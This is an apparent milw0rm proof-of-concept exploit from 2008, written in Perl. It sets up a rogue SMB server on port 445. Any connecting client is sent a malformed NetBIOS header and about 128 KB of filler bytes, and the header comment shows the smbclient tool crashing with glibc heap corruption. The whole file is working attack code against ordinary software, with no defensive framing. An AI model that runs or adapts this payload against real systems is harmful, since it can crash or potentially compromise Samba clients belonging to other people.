#!/usr/bin/perl
# 06/01/2008 - k`sOSe
#
# ~ # smbclient //localhost/w00t
# *** glibc detected *** smbclient: free(): invalid next size (fast): 0x0823c2d8 ***
#

use warnings;
use strict;
use IO::Socket;


my $sock = IO::Socket::INET->new(LocalAddr => '0.0.0.0', LocalPort => '445', Listen => 1, Reuse => 1) || die($!);

while(my $csock = $sock->accept())
{
	print $csock	"\x00" .
			"\x01\xff\xff" .
			"\x41" x 131071;
			
}

# milw0rm.com [2008-06-01]
